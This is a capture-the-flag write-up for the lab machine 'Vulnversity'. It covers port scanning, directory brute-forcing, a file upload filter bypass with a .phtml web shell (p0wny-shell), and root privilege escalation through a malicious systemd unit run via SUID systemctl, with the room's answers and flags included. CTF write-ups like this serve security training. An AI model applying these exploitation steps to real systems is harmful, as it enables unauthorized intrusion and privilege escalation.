# Vulnversity

## 1. Reconnaissance

```
IP=10.10.23.91
sudo nmap -sC -sV $IP | tee nmap
```

```
Starting Nmap 7.60 ( https://nmap.org ) at 2020-06-15 09:34 -03
Nmap scan report for 10.10.23.91
Host is up (0.24s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (EdDSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2020-06-15T08:36:43-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-06-15 09:36:45
|_  start_date: 1600-12-31 21:25:56

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.29 seconds

```

### Questions

1. `6 ports open`
2. `squid version is 3.5.12`
3. `400`
4. `-n/-R: Never do DNS resolution/Always resolve [default: sometimes]`
5. `ubuntu`
6. `3333`

## 2. Locating directories using GoBuster

```
sudo gobuster dir -u http://$IP:3333 -w /opt/hacking/wfuzz/wordlist/general/common.txt | tee gobuster
```

```
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.174.33:3333
[+] Threads:        10
[+] Wordlist:       /opt/hacking/wfuzz/wordlist/general/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/15 16:14:20 Starting gobuster
===============================================================
/css (Status: 301)
/images (Status: 301)
/internal (Status: 301)
/js (Status: 301)
===============================================================
2020/06/15 16:14:40 Finished
===============================================================

```

### Questions

2. `/internal`

## 3. Compromise the webserver

#### Request

```
POST /internal/index.php HTTP/1.1
Host: 10.10.174.33:3333
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------19067101541521406929975696068
Content-Length: 376058
Origin: http://10.10.174.33:3333
Connection: close
Referer: http://10.10.174.33:3333/internal/
Upgrade-Insecure-Requests: 1

-----------------------------19067101541521406929975696068
Content-Disposition: form-data; name="file"; filename="1.phtml"
Content-Type: image/jpeg
```

#### Response

```
HTTP/1.1 200 OK
Date: Mon, 15 Jun 2020 19:32:36 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 532
Connection: close
Content-Type: text/html; charset=UTF-8

<html>
<head>
<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
<style>
html, body {
    height: 30%;
}
html {
    display: table;
    margin: auto;
}
body {
    display: table-cell;
    vertical-align: middle;
    text-align: center;
}
</style>
</head>
<body>
<form action="index.php" method="post" enctype="multipart/form-data">
    <h3>Upload</h3><br />
    <input type="file" name="file" id="file">
    <input class="btn btn-primary" type="submit" value="Submit" name="submit">
</form>
Success</body>
</html>

```

```
https://github.com/flozz/p0wny-shell
```

### Questions

1. `.php`
2. `.phtml`
3. `bill`
4. `8bd7992fbe8a6ad22a63361004cfcedb`

## 4. Privilege Escalation

```
find / -user root -perm -4000 -exec ls -ldb {} \; | grep -v Permission
```

create /tmp/root.service

```
[Unit]
Description=Root
[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "cat /root/root.txt"
[Install]
WantedBy=multi.user.target
```

```
/bin/systemctl enable /tmp/root.service
/bin/systemctl start root.service
/bin/systemctl status root.service
```

### Questions

1. `/bin/systemctl`
2. `a58ff8579f0a9270368d33a9966c7fd5`
